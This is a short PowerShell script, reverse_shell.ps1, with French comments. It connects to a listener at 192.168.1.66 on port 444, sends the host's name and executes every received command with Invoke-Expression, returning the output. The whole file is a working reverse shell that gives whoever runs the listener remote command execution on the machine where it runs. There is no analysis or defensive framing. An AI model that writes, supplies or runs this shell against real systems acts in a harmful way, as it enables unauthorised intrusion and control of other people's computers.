# reverse_shell.ps1

$ip = "192.168.1.66"  # Adresse IP de ta machine locale
$port = 444  # Le port que tu écoutes sur ta machine locale

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

$writer.AutoFlush = $true
$stream.ReadTimeout = -1

$writer.WriteLine("Connexion établie à partir de : " + (hostname))

while($true) {
    $writer.Write("> ")
    $data = ""
    while($stream.DataAvailable -eq $false) {
        Start-Sleep -Milliseconds 200
    }

    while(($read = $stream.Read($buffer, 0, 1024)) -gt 0) {
        $data += $encoding.GetString($buffer, 0, $read)
        if($data.Trim().EndsWith("exit")) {
            break
        }
    }

    if($data.Trim().ToLower() -eq "exit") {
        break
    }

    try {
        $output = Invoke-Expression $data 2>&1
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Erreur : " + $_.Exception.Message)
    }
}

$stream.Close()
$client.Close()
